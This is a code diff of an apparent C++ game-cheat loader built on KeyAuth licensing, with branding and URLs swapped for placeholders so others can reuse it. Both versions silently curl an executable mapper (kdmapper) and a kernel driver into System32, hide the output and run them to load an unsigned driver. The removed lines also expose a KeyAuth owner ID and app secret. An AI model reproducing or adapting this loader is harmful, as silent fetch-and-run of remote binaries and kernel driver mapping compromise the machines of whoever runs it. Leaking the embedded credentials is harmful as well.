@@ -14,7 +14,7 @@
 
 
 
-
+//if you sell this exact source without changing the slightest thing besides the offsets im going to personally hunt after you skid :))))
 
 
 
@@ -28,11 +28,11 @@ const std::string compilation_time = (std::string)skCrypt(__TIME__);
 
 using namespace KeyAuth;
 
-std::string name = "Quantom"; // application name. right above the blurred text aka the secret on the licenses tab among other tabs
+std::string name = ""; // application name. right above the blurred text aka the secret on the licenses tab among other tabs
 std::string ownerid = "7MXJE4V6xa"; // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
-std::string secret = "c50ead0c51f8d7ceff12fed7ca2837d0f5b2fbb566d12ab8207d1cf1ca68d739"; // app secret, the blurred text on licenses tab and other tabs
-std::string version = "1.0"; // leave alone unless you've changed version on website; // leave alone unless you've changed version on website
-std::string url = skCrypt("https://keyauth.win/api/1.2/").decrypt(); // change if you're self-hosting
+std::string secret = ""; // app secret, the blurred text on licenses tab and other tabs
+std::string version = ""; // leave alone unless you've changed version on website; // leave alone unless you've changed version on website
+std::string url = skCrypt("").decrypt(); // change if you're self-hosting
 
 api KeyAuthApp(name, ownerid, secret, version, url);
 
@@ -44,7 +44,7 @@ int main()
 	
 	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	SetConsoleTextAttribute(hConsole, 0x0D);
-	std::string consoleTitle = ("Quantom");
+	std::string consoleTitle = ("YourPastesNameSkid");
 	std::cout << skCrypt("\n\n Connecting..");
 	KeyAuthApp.init();
 	if (!KeyAuthApp.data.success)
@@ -106,8 +106,8 @@ int main()
 	std::this_thread::sleep_for(std::chrono::seconds(1));
 	std::cout << ("Loading driver...");
 	system("CLS");
-	system("curl --silent https://verdant-macaron-fdf7d6.netlify.app/kdmapper.exe --output C:\\Windows\\System32\\drvmapper.exe >nul 2>&1");
-	system("curl --silent https://verdant-macaron-fdf7d6.netlify.app/driver.sys --output C:\\Windows\\System32\\drvmoment.sys >nul 2>&1");
+	system("curl --silent https://yourMapperLink.exe --output C:\\Windows\\System32\\drvmapper.exe >nul 2>&1"); 
+	system("curl --silent https://yourDriverLink.exe --output C:\\Windows\\System32\\drvmoment.sys >nul 2>&1");
 	system("cd C:\\Windows\\System32\\");
 	system("cls");
 	system("C:\\Windows\\System32\\drvmapper.exe C:\\Windows\\System32\\drvmoment.sys");
@@ -120,7 +120,7 @@ int main()
 
 
 
-	std::cout << ("                                             ->Quantom Injected<-");
+	std::cout << ("                                             -> YourPastesNameSkid Injected<-");
 	std::this_thread::sleep_for(std::chrono::seconds(2));
 
 
